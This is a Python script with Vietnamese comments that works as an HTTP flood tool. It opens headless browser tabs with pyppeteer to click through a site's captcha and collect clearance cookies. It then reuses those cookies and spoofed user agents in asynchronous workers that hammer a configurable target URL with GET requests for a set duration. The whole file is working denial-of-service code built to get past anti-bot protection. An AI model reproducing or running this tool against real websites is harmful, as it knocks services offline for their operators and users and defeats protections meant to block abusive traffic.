import os
import sys
import asyncio
import random
import time
import json
from pyppeteer import launch
import aiohttp

# ================= CONFIG =================
TARGET_URL = os.getenv("TARGET_URL")
DURATION = int(os.getenv("DURATION", "20"))   # giây
MAX_TAB = int(os.getenv("MAX_TAB", "2"))      # số tab mở solve captcha
MAX_RPS = int(os.getenv("MAX_RPS", "10"))     # rps mỗi tab (6-10)

if not TARGET_URL:
    print("[ERROR] TARGET_URL environment variable not set")
    sys.exit(1)

# ==========================================

async def solve_captcha_and_get_cookie(tab_id: int):
    """Mỗi tab mở solve captcha và lấy cookie"""
    browser = await launch(headless=True,
                           args=["--no-sandbox", "--disable-setuid-sandbox"])
    page = await browser.newPage()

    ua = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 " \
         f"(KHTML, like Gecko) Chrome/124.0.{tab_id} Safari/537.36"
    await page.setUserAgent(ua)

    await page.goto(TARGET_URL, {"waitUntil": "domcontentloaded"})

    try:
        box = await page.querySelector("iframe, div[role=checkbox]")
        if box:
            print(f"[TAB{tab_id}] Found captcha, clicking...")
            await box.click()
            await page.waitForTimeout(5000)
    except Exception:
        pass

    cookies = await page.cookies()
    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
    await browser.close()

    print(f"[TAB{tab_id}] Got cookies")
    return cookie_str, ua

async def flood_worker(tab_id: int, cookie: str, ua: str, stop_time: float):
    """Worker gửi request với cookie/UA lấy được"""
    headers = {
        "User-Agent": ua,
        "Cookie": cookie,
        "Accept": "*/*"
    }
    interval = 1.0 / MAX_RPS
    sent = 0
    errors = 0

    async with aiohttp.ClientSession() as session:
        while time.time() < stop_time:
            start = time.time()
            try:
                async with session.get(TARGET_URL, headers=headers) as resp:
                    await resp.text()
                    sent += 1
                    print(f"[TAB{tab_id}] {resp.status} (sent={sent})")
            except Exception as e:
                errors += 1
                print(f"[TAB{tab_id}] ERR {e}")
            elapsed = time.time() - start
            if elapsed < interval:
                await asyncio.sleep(interval - elapsed)

    return sent, errors

async def main():
    stop_time = time.time() + DURATION

    # Solve captcha song song cho 2 tab
    cookies_ua = await asyncio.gather(*[
        solve_captcha_and_get_cookie(i+1) for i in range(MAX_TAB)
    ])

    # Flood song song
    results = await asyncio.gather(*[
        flood_worker(i+1, cookies_ua[i][0], cookies_ua[i][1], stop_time)
        for i in range(MAX_TAB)
    ])

    total_sent = sum(r[0] for r in results)
    total_err = sum(r[1] for r in results)
    print(f"\n[SUMMARY] Sent={total_sent}, Errors={total_err}")

if __name__ == "__main__":
    asyncio.run(main())
